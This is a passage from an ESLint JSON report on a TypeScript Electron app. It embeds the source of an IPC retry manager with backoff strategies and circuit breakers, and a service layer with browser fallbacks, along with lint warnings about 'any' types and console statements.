=> boolean;\n  onRetry?: (attempt: number, error: any) => void;\n  onSuccess?: (result: any, attempts: number) => void;\n  onFailure?: (error: any, attempts: number) => void;\n}\n\n// Operation metadata\ninterface OperationMetadata {\n  id: string;\n  methodName: string;\n  args: any[];\n  config: Required<RetryConfig>;\n  attempts: number;\n  firstAttempt: Date;\n  lastAttempt: Date;\n  errors: any[];\n}\n\n// Circuit breaker state\ninterface CircuitBreakerState {\n  isOpen: boolean;\n  failureCount: number;\n  lastFailureTime: Date;\n  nextAttemptTime: Date;\n}\n\n// Default retry configurations by priority\nconst DEFAULT_RETRY_CONFIGS: Record<OperationPriority, Partial<RetryConfig>> = {\n  critical: {\n    strategy: 'exponential',\n    maxRetries: 5,\n    baseDelay: 500,\n    maxDelay: 10000,\n    jitter: true,\n    circuitBreaker: false, // Critical operations bypass circuit breaker\n    timeout: 10000\n  },\n  high: {\n    strategy: 'exponential',\n    maxRetries: 4,\n    baseDelay: 1000,\n    maxDelay: 8000,\n    jitter: true,\n    circuitBreaker: true,\n    circuitBreakerThreshold: 3,\n    timeout: 8000\n  },\n  normal: {\n    strategy: 'exponential',\n    maxRetries: 3,\n    baseDelay: 1000,\n    maxDelay: 5000,\n    jitter: true,\n    circuitBreaker: true,\n    circuitBreakerThreshold: 5,\n    timeout: 5000\n  },\n  low: {\n    strategy: 'linear',\n    maxRetries: 2,\n    baseDelay: 2000,\n    maxDelay: 10000,\n    jitter: false,\n    circuitBreaker: true,\n    circuitBreakerThreshold: 3,\n    timeout: 3000\n  }\n};\n\n/**\n * Enhanced retry mechanism for IPC operations\n */\nexport class IPCRetryManager {\n  private circuitBreakers = new Map<string, CircuitBreakerState>();\n  private operationQueue: OperationMetadata[] = [];\n  private isProcessing = false;\n  private config: Required<RetryConfig>;\n\n  constructor(defaultConfig: Partial<RetryConfig> = {}) {\n    this.config = {\n      strategy: 'exponential',\n      priority: 'normal',\n      maxRetries: 3,\n      baseDelay: 1000,\n      maxDelay: 5000,\n      jitter: true,\n      circuitBreaker: true,\n      circuitBreakerThreshold: 5,\n      circuitBreakerTimeout: 30000,\n      timeout: 5000,\n      retries: 3,\n      retryDelay: 1000,\n      retryBackoff: 2,\n      enableCache: true,\n      cacheTimeout: 60000,\n      ...defaultConfig\n    } as Required<RetryConfig>;\n  }\n\n  /**\n   * Execute an operation with retry logic\n   */\n  async executeWithRetry<T = any>(\n    methodName: string,\n    args: any[] = [],\n    config: Partial<RetryConfig> = {}\n  ): Promise<IPCResponse<T>> {\n    const operationConfig = this.mergeConfig(config);\n    const operationId = `${methodName}_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n    \n    const operation: OperationMetadata = {\n      id: operationId,\n      methodName,\n      args,\n      config: operationConfig,\n      attempts: 0,\n      firstAttempt: new Date(),\n      lastAttempt: new Date(),\n      errors: []\n    };\n\n    // Check circuit breaker\n    if (operationConfig.circuitBreaker) {\n      const circuitState = this.getCircuitBreakerState(methodName);\n      if (circuitState.isOpen && new Date() < circuitState.nextAttemptTime) {\n        return {\n          success: false,\n          error: {\n            code: IPCErrorCode.CONNECTION_LOST,\n            message: `Circuit breaker is open for ${methodName}. Next attempt at ${circuitState.nextAttemptTime.toLocaleTimeString()}`,\n            timestamp: new Date().toISOString(),\n            retryable: false\n          }\n        };\n      }\n    }\n\n    return this.attemptOperation<T>(operation);\n  }\n\n  /**\n   * Execute critical operations with highest priority\n   */\n  async executeCritical<T = any>(\n    methodName: string,\n    args: any[] = [],\n    config: Partial<RetryConfig> = {}\n  ): Promise<IPCResponse<T>> {\n    return this.executeWithRetry<T>(methodName, args, {\n      ...DEFAULT_RETRY_CONFIGS.critical,\n      ...config,\n      priority: 'critical'\n    });\n  }\n\n  /**\n   * Attempt to execute an operation\n   */\n  private async attemptOperation<T>(operation: OperationMetadata): Promise<IPCResponse<T>> {\n    const { methodName, args, config } = operation;\n    \n    while (operation.attempts <= config.maxRetries) {\n      operation.attempts++;\n      operation.lastAttempt = new Date();\n\n      try {\n        // Call onRetry callback\n        if (operation.attempts > 1) {\n          config.onRetry?.(operation.attempts, operation.errors[operation.errors.length - 1]);\n        }\n\n        // Execute the operation\n        const result = await ipcWrapper.invoke<T>(methodName, ...args);\n\n        if (result.success) {\n          // Reset circuit breaker on success\n          if (config.circuitBreaker) {\n            this.resetCircuitBreaker(methodName);\n          }\n\n          // Call success callback\n          config.onSuccess?.(result.data, operation.attempts);\n\n          return result;\n        } else {\n          // Handle IPC-level errors\n          const error = result.error!;\n          operation.errors.push(error);\n\n          // Check if we should retry this error\n          if (config.shouldRetry && !config.shouldRetry(error)) {\n            break;\n          }\n\n          // Don't retry non-retryable errors\n          if (!error.retryable) {\n            break;\n          }\n\n          // Check for specific error codes that shouldn't be retried\n          if (this.isNonRetryableError(error.code)) {\n            break;\n          }\n        }\n\n      } catch (error) {\n        operation.errors.push(error);\n\n        // Check if we should retry this error\n        if (config.shouldRetry && !config.shouldRetry(error)) {\n          break;\n        }\n      }\n\n      // If this was the last attempt, break\n      if (operation.attempts > config.maxRetries) {\n        break;\n      }\n\n      // Wait before next attempt\n      const delay = this.calculateDelay(operation.attempts, config);\n      await this.sleep(delay);\n    }\n\n    // All attempts failed\n    const lastError = operation.errors[operation.errors.length - 1];\n    \n    // Update circuit breaker\n    if (config.circuitBreaker) {\n      this.updateCircuitBreaker(methodName, lastError);\n    }\n\n    // Call failure callback\n    config.onFailure?.(lastError, operation.attempts);\n\n    // Return the last error\n    if (lastError && typeof lastError === 'object' && 'code' in lastError) {\n      return {\n        success: false,\n        error: lastError\n      };\n    }\n\n    return {\n      success: false,\n      error: {\n        code: IPCErrorCode.SYSTEM_ERROR,\n        message: `Failed after ${operation.attempts} attempts: ${lastError}`,\n        details: { operation, errors: operation.errors },\n        timestamp: new Date().toISOString(),\n        retryable: false\n      }\n    };\n  }\n\n  /**\n   * Calculate delay for next retry attempt\n   */\n  private calculateDelay(attempt: number, config: Required<RetryConfig>): number {\n    let delay: number;\n\n    switch (config.strategy) {\n      case 'exponential':\n        delay = config.baseDelay * Math.pow(2, attempt - 1);\n        break;\n      \n      case 'linear':\n        delay = config.baseDelay * attempt;\n        break;\n      \n      case 'fibonacci':\n        delay = config.baseDelay * this.fibonacci(attempt);\n        break;\n      \n      case 'custom':\n        delay = config.customDelayFn ? config.customDelayFn(attempt) : config.baseDelay;\n        break;\n      \n      default:\n        delay = config.baseDelay;\n    }\n\n    // Apply jitter if enabled\n    if (config.jitter) {\n      const jitterAmount = delay * 0.1;\n      delay += (Math.random() - 0.5) * 2 * jitterAmount;\n    }\n\n    // Ensure delay doesn't exceed maximum\n    return Math.min(delay, config.maxDelay);\n  }\n\n  /**\n   * Calculate fibonacci number for fibonacci strategy\n   */\n  private fibonacci(n: number): number {\n    if (n <= 1) return 1;\n    let a = 1, b = 1;\n    for (let i = 2; i <= n; i++) {\n      [a, b] = [b, a + b];\n    }\n    return b;\n  }\n\n  /**\n   * Check if error code should not be retried\n   */\n  private isNonRetryableError(code: IPCErrorCode): boolean {\n    const nonRetryableCodes = [\n      IPCErrorCode.PERMISSION_DENIED,\n      IPCErrorCode.METHOD_NOT_FOUND,\n      IPCErrorCode.VALIDATION_FAILED,\n      IPCErrorCode.INVALID_PARAMETERS\n    ];\n    return nonRetryableCodes.includes(code);\n  }\n\n  /**\n   * Get or create circuit breaker state\n   */\n  private getCircuitBreakerState(methodName: string): CircuitBreakerState {\n    if (!this.circuitBreakers.has(methodName)) {\n      this.circuitBreakers.set(methodName, {\n        isOpen: false,\n        failureCount: 0,\n        lastFailureTime: new Date(0),\n        nextAttemptTime: new Date(0)\n      });\n    }\n    return this.circuitBreakers.get(methodName)!;\n  }\n\n  /**\n   * Update circuit breaker on failure\n   */\n  private updateCircuitBreaker(methodName: string, error: any): void {\n    const state = this.getCircuitBreakerState(methodName);\n    state.failureCount++;\n    state.lastFailureTime = new Date();\n\n    if (state.failureCount >= this.config.circuitBreakerThreshold) {\n      state.isOpen = true;\n      state.nextAttemptTime = new Date(Date.now() + this.config.circuitBreakerTimeout);\n    }\n  }\n\n  /**\n   * Reset circuit breaker on success\n   */\n  private resetCircuitBreaker(methodName: string): void {\n    const state = this.getCircuitBreakerState(methodName);\n    state.isOpen = false;\n    state.failureCount = 0;\n  }\n\n  /**\n   * Merge configuration with defaults\n   */\n  private mergeConfig(userConfig: Partial<RetryConfig>): Required<RetryConfig> {\n    const priority = userConfig.priority || this.config.priority;\n    const priorityDefaults = DEFAULT_RETRY_CONFIGS[priority] || {};\n    \n    return {\n      ...this.config,\n      ...priorityDefaults,\n      ...userConfig\n    } as Required<RetryConfig>;\n  }\n\n  /**\n   * Sleep utility\n   */\n  private sleep(ms: number): Promise<void> {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n\n  /**\n   * Get circuit breaker status for all methods\n   */\n  getCircuitBreakerStatus(): Record<string, CircuitBreakerState> {\n    const status: Record<string, CircuitBreakerState> = {};\n    for (const [methodName, state] of this.circuitBreakers) {\n      status[methodName] = { ...state };\n    }\n    return status;\n  }\n\n  /**\n   * Reset all circuit breakers\n   */\n  resetAllCircuitBreakers(): void {\n    this.circuitBreakers.clear();\n  }\n\n  /**\n   * Update default configuration\n   */\n  updateConfig(newConfig: Partial<RetryConfig>): void {\n    this.config = { ...this.config, ...newConfig } as Required<RetryConfig>;\n  }\n}\n\n// Default instance for convenience\nexport const ipcRetry = new IPCRetryManager();\n\n// Convenience functions for different priority levels\nexport const ipcCritical = {\n  invoke: <T = any>(methodName: string, ...args: any[]) =>\n    ipcRetry.executeCritical<T>(methodName, args),\n};\n\nexport const ipcHigh = {\n  invoke: <T = any>(methodName: string, ...args: any[]) =>\n    ipcRetry.executeWithRetry<T>(methodName, args, { priority: 'high' }),\n};\n\nexport const ipcNormal = {\n  invoke: <T = any>(methodName: string, ...args: any[]) =>\n    ipcRetry.executeWithRetry<T>(methodName, args, { priority: 'normal' }),\n};\n\nexport const ipcLow = {\n  invoke: <T = any>(methodName: string, ...args: any[]) =>\n    ipcRetry.executeWithRetry<T>(methodName, args, { priority: 'low' }),\n};","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/performance-database.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/services.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":14,"column":38,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":14,"endColumn":41,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[473,476],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[473,476],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":272,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":272,"endColumn":18,"suggestions":[{"fix":{"range":[7596,7644],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":280,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":280,"endColumn":18,"suggestions":[{"fix":{"range":[7799,7847],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":449,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":449,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12479,12482],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12479,12482],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":452,"column":13,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":452,"endColumn":16,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12543,12546],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12543,12546],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":494,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":494,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[14010,14013],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[14010,14013],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":503,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":503,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[14320,14323],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[14320,14323],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":7,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Service Layer with IPC Error Handling (2025)\n * \n * This module provides a service layer for common Electron IPC operations\n * with comprehensive error handling, caching, and fallback mechanisms.\n * \n * Following 2025 best practices for service architecture and error resilience.\n */\n\nimport { ipcCritical, ipcHigh, ipcNormal, ipcLow } from './ipcRetry';\nimport { ipc, type IPCResponse } from './ipc';\n\n// Service response types\nexport interface ServiceResponse<T = any> {\n  success: boolean;\n  data?: T;\n  error?: string;\n  fromCache?: boolean;\n  retryCount?: number;\n}\n\n// App information services\nexport class AppInfoService {\n  /**\n   * Get application version with caching and fallback\n   */\n  static async getVersion(): Promise<ServiceResponse<string>> {\n    try {\n      const response = await ipcHigh.invoke<string>('getVersion');\n      \n      if (response.success) {\n        return {\n          success: true,\n          data: response.data,\n          fromCache: false\n        };\n      } else {\n        // Try to get cached version\n        const cachedVersion = localStorage.getItem('app_version');\n        if (cachedVersion) {\n          return {\n            success: true,\n            data: cachedVersion,\n            fromCache: true,\n            error: 'Using cached version due to IPC error'\n          };\n        }\n\n        return {\n          success: false,\n          error: response.error?.message || 'Failed to get app version'\n        };\n      }\n    } catch (error) {\n      // Fallback to cached version\n      const cachedVersion = localStorage.getItem('app_version') || 'Unknown';\n      return {\n        success: true,\n        data: cachedVersion,\n        fromCache: true,\n        error: `IPC error, using cached version: ${error}`\n      };\n    }\n  }\n\n  /**\n   * Get platform information with retry and caching\n   */\n  static async getPlatform(): Promise<ServiceResponse<string>> {\n    try {\n      const response = await ipcNormal.invoke<string>('getPlatform');\n      \n      if (response.success) {\n        // Cache the platform for future use\n        localStorage.setItem('app_platform', response.data!);\n        return {\n          success: true,\n          data: response.data,\n          fromCache: false\n        };\n      } else {\n        // Use cached platform or detect from user agent\n        const cachedPlatform = localStorage.getItem('app_platform');\n        if (cachedPlatform) {\n          return {\n            success: true,\n            data: cachedPlatform,\n            fromCache: true,\n            error: 'Using cached platform due to IPC error'\n          };\n        }\n\n        // Fallback to user agent detection\n        const platformFromUA = this.detectPlatformFromUserAgent();\n        return {\n          success: true,\n          data: platformFromUA,\n          fromCache: false,\n          error: 'Using user agent detection as fallback'\n        };\n      }\n    } catch (error) {\n      // Fallback detection\n      const platformFromUA = this.detectPlatformFromUserAgent();\n      return {\n        success: true,\n        data: platformFromUA,\n        fromCache: false,\n        error: `IPC error, using fallback detection: ${error}`\n      };\n    }\n  }\n\n  /**\n   * Detect platform from user agent as fallback\n   */\n  private static detectPlatformFromUserAgent(): string {\n    const userAgent = navigator.userAgent.toLowerCase();\n    \n    if (userAgent.includes('mac os x')) return 'darwin';\n    if (userAgent.includes('windows')) return 'win32';\n    if (userAgent.includes('linux')) return 'linux';\n    \n    return 'unknown';\n  }\n}\n\n// File system services\nexport class FileSystemService {\n  /**\n   * Get documents path with fallback to browser alternatives\n   */\n  static async getDocumentsPath(): Promise<ServiceResponse<string>> {\n    try {\n      const response = await ipcNormal.invoke<string>('getDocumentsPath');\n      \n      if (response.success) {\n        return {\n          success: true,\n          data: response.data,\n          fromCache: false\n        };\n      } else {\n        // Browser fallback - use Downloads as alternative\n        return {\n          success: true,\n          data: '~/Downloads', // Browser-safe fallback\n          fromCache: false,\n          error: 'Using browser fallback path'\n        };\n      }\n    } catch (error) {\n      return {\n        success: true,\n        data: '~/Downloads', // Safe fallback\n        fromCache: false,\n        error: `IPC error, using fallback: ${error}`\n      };\n    }\n  }\n\n  /**\n   * Get app data path with local storage fallback\n   */\n  static async getAppDataPath(): Promise<ServiceResponse<string>> {\n    try {\n      const response = await ipcHigh.invoke<string>('getAppDataPath');\n      \n      if (response.success) {\n        return {\n          success: true,\n          data: response.data,\n          fromCache: false\n        };\n      } else {\n        // Use localStorage as fallback for browser environments\n        return {\n          success: true,\n          data: 'localStorage://taskmaster-data',\n          fromCache: false,\n          error: 'Using localStorage as fallback for app data'\n        };\n      }\n    } catch (error) {\n      return {\n        success: true,\n        data: 'localStorage://taskmaster-data',\n        fromCache: false,\n        error: `IPC error, using localStorage fallback: ${error}`\n      };\n    }\n  }\n}\n\n// Dialog services\nexport class DialogService {\n  /**\n   * Show error dialog with fallback to browser alert\n   */\n  static async showError(title: string, content: string): Promise<ServiceResponse<void>> {\n    try {\n      const response = await ipcNormal.invoke<void>('showError', title, content);\n      \n      if (response.success) {\n        return {\n          success: true,\n          fromCache: false\n        };\n      } else {\n        // Fallback to browser alert\n        alert(`${title}\\n\\n${content}`);\n        return {\n          success: true,\n          fromCache: false,\n          error: 'Used browser alert as fallback'\n        };\n      }\n    } catch (error) {\n      // Browser fallback\n      alert(`${title}\\n\\n${content}`);\n      return {\n        success: true,\n        fromCache: false,\n        error: `IPC error, used browser alert: ${error}`\n      };\n    }\n  }\n\n  /**\n   * Show notification with multiple fallback strategies\n   */\n  static async showNotification(\n    title: string, \n    body: string, \n    options: NotificationOptions = {}\n  ): Promise<ServiceResponse<void>> {\n    try {\n      // Try IPC notification first (if custom implementation exists)\n      if (ipc.hasMethod('showNotification')) {\n        const response = await ipcLow.invoke<void>('showNotification', title, body, options);\n        if (response.success) {\n          return {\n            success: true,\n            fromCache: false\n          };\n        }\n      }\n\n      // Fallback to Web Notifications API\n      if ('Notification' in window) {\n        if (Notification.permission === 'granted') {\n          new Notification(title, { body, ...options });\n          return {\n            success: true,\n            fromCache: false,\n            error: 'Used Web Notifications API as fallback'\n          };\n        } else if (Notification.permission !== 'denied') {\n          const permission = await Notification.requestPermission();\n          if (permission === 'granted') {\n            new Notification(title, { body, ...options });\n            return {\n              success: true,\n              fromCache: false,\n              error: 'Used Web Notifications API after permission request'\n            };\n          }\n        }\n      }\n\n      // Final fallback to console\n      console.log(`Notification: ${title} - ${body}`);\n      return {\n        success: true,\n        fromCache: false,\n        error: 'Used console log as final fallback'\n      };\n\n    } catch (error) {\n      console.log(`Notification: ${title} - ${body}`);\n      return {\n        success: true,\n        fromCache: false,\n        error: `All notification methods failed, used console: ${error}`\n      };\n    }\n  }\n}\n\n// System integration services\nexport class SystemService {\n  /**\n   * Check if running in Electron environment\n   */\n  static isElectron(): boolean {\n    return ipc.isAvailable();\n  }\n\n  /**\n   * Get system capabilities with comprehensive fallbacks\n   */\n  static async getCapabilities(): Promise<ServiceResponse<{\n    hasFileAccess: boolean;\n    hasNotifications: boolean;\n    hasDialogs: boolean;\n    platform: string;\n    isOnline: boolean;\n  }>> {\n    try {\n      const capabilities = {\n        hasFileAccess: false,\n        hasNotifications: false,\n        hasDialogs: false,\n        platform: 'unknown',\n        isOnline: navigator.onLine\n      };\n\n      // Check IPC availability\n      const isElectron = this.isElectron();\n      if (isElectron) {\n        capabilities.hasFileAccess = ipc.hasMethod('getDocumentsPath');\n        capabilities.hasDialogs = ipc.hasMethod('showError');\n        \n        // Get platform\n        const platformResponse = await AppInfoService.getPlatform();\n        if (platformResponse.success && platformResponse.data) {\n          capabilities.platform = platformResponse.data;\n        }\n      } else {\n        // Browser capabilities\n        capabilities.hasFileAccess = 'showDirectoryPicker' in window;\n        capabilities.hasNotifications = 'Notification' in window;\n        capabilities.hasDialogs = true; // Browser alert/confirm always available\n        capabilities.platform = this.getBrowserPlatform();\n      }\n\n      // Check notifications\n      if ('Notification' in window) {\n        capabilities.hasNotifications = Notification.permission === 'granted' ||\n                                      Notification.permission === 'default';\n      }\n\n      return {\n        success: true,\n        data: capabilities,\n        fromCache: false\n      };\n\n    } catch (error) {\n      // Minimal fallback capabilities\n      return {\n        success: true,\n        data: {\n          hasFileAccess: false,\n          hasNotifications: 'Notification' in window,\n          hasDialogs: true,\n          platform: this.getBrowserPlatform(),\n          isOnline: navigator.onLine\n        },\n        fromCache: false,\n        error: `Error detecting capabilities: ${error}`\n      };\n    }\n  }\n\n  /**\n   * Get platform from browser user agent\n   */\n  private static getBrowserPlatform(): string {\n    const userAgent = navigator.userAgent.toLowerCase();\n    const platform = navigator.platform.toLowerCase();\n    \n    if (platform.includes('mac') || userAgent.includes('mac os x')) return 'darwin';\n    if (platform.includes('win') || userAgent.includes('windows')) return 'win32';\n    if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';\n    if (userAgent.includes('android')) return 'android';\n    if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'ios';\n    \n    return 'browser';\n  }\n\n  /**\n   * Perform health check on all services\n   */\n  static async performHealthCheck(): Promise<ServiceResponse<{\n    ipc: boolean;\n    appInfo: boolean;\n    fileSystem: boolean;\n    dialogs: boolean;\n    timestamp: string;\n  }>> {\n    const results = {\n      ipc: false,\n      appInfo: false,\n      fileSystem: false,\n      dialogs: false,\n      timestamp: new Date().toISOString()\n    };\n\n    try {\n      // Test IPC availability\n      results.ipc = ipc.isAvailable();\n\n      // Test app info services\n      try {\n        const versionResponse = await AppInfoService.getVersion();\n        results.appInfo = versionResponse.success;\n      } catch {\n        results.appInfo = false;\n      }\n\n      // Test file system services\n      try {\n        const pathResponse = await FileSystemService.getDocumentsPath();\n        results.fileSystem = pathResponse.success;\n      } catch {\n        results.fileSystem = false;\n      }\n\n      // Test dialog services\n      try {\n        // Test without actually showing a dialog\n        results.dialogs = ipc.hasMethod('showError') || true; // Browser always has alerts\n      } catch {\n        results.dialogs = true; // Browser fallback always available\n      }\n\n      return {\n        success: true,\n        data: results,\n        fromCache: false\n      };\n\n    } catch (error) {\n      return {\n        success: false,\n        data: results,\n        error: `Health check failed: ${error}`\n      };\n    }\n  }\n}\n\n// Batch operations service\nexport class BatchService {\n  /**\n   * Execute multiple IPC operations with priority handling\n   */\n  static async executeBatch<T = any>(\n    operations: Array<{\n      method: string;\n      args: any[];\n      priority?: 'critical' | 'high' | 'normal' | 'low';\n      allowFailure?: boolean;\n    }>\n  ): Promise<ServiceResponse<T[]>> {\n    const results: T[] = [];\n    const errors: string[] = [];\n    \n    try {\n      // Sort operations by priority\n      const sortedOps = operations.sort((a, b) => {\n        const priorityOrder = { critical: 0, high: 1, normal: 2, low: 3 };\n        const aPriority = priorityOrder[a.priority || 'normal'];\n        const bPriority = priorityOrder[b.priority || 'normal'];\n        return aPriority - bPriority;\n      });\n\n      // Execute operations\n      for (const op of sortedOps) {\n        try {\n          let response: IPCResponse<T>;\n          \n          switch (op.priority) {\n            case 'critical':\n              response = await ipcCritical.invoke<T>(op.method, ...op.args);\n              break;\n            case 'high':\n              response = await ipcHigh.invoke<T>(op.method, ...op.args);\n              break;\n            case 'low':\n              response = await ipcLow.invoke<T>(op.method, ...op.args);\n              break;\n            default:\n              response = await ipcNormal.invoke<T>(op.method, ...op.args);\n          }\n\n          if (response.success) {\n            results.push(response.data!);\n          } else {\n            const errorMsg = `${op.method}: ${response.error?.message}`;\n            if (op.allowFailure) {\n              errors.push(errorMsg);\n              results.push(null as any); // Placeholder for failed operation\n            } else {\n              throw new Error(errorMsg);\n            }\n          }\n        } catch (error) {\n          const errorMsg = `${op.method}: ${error}`;\n          if (op.allowFailure) {\n            errors.push(errorMsg);\n            results.push(null as any);\n          } else {\n            throw error;\n          }\n        }\n      }\n\n      return {\n        success: true,\n        data: results,\n        error: errors.length > 0 ? errors.join('; ') : undefined\n      };\n\n    } catch (error) {\n      return {\n        success: false,\n        data: results,\n        error: `Batch operation failed: ${error}`\n      };\n    }\n  }\n}\n\n// Export service instances for convenience\nexport const services = {\n  app: AppInfoService,\n  fs: FileSystemService,\n  dialog: DialogService,\n  system: SystemService,\n  batch: BatchService\n};\n\nexport default services;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/services/crashRecovery.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":22,"column":35,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":22,"endColumn":38,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[784,787],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[784,787],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":50,"column":48,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":50,"endColumn":51,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1736,1739],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1736,1739],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":60,"column":11,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":60,"endColumn":14,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1983,1986],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1983,1986],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":73,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":73,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2257,2260],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2257,2260],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":161,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":161,"endColumn":19,"suggestions":[{"fix":{"range":[4441,4500],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":184,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":184,"endColumn":18,"suggestions":[{"fix":{"range":[5026,5080],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":187,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":187,"endColumn":20,"suggestions":[{"fix":{"range":[5110,5179],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":216,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":216,"endColumn":19,"suggestions":[{"fix":{"range":[5966,6033],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":324,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":324,"endColumn":23,"suggestions":[{"fix":{"range":[9165,9229],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":373,"column":15,"nodeType":"MemberExpression","messageId":"unexpected","endLine":373,"endColumn":26,"suggestions":[{"fix":{"range":[10848,10925],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":389,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":389,"endColumn":26,"suggestions":[{"fix":{"range":[11375,11467],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":394,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":394,"endColumn":23,"suggestions":[{"fix":{"range":[11527,11584],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the 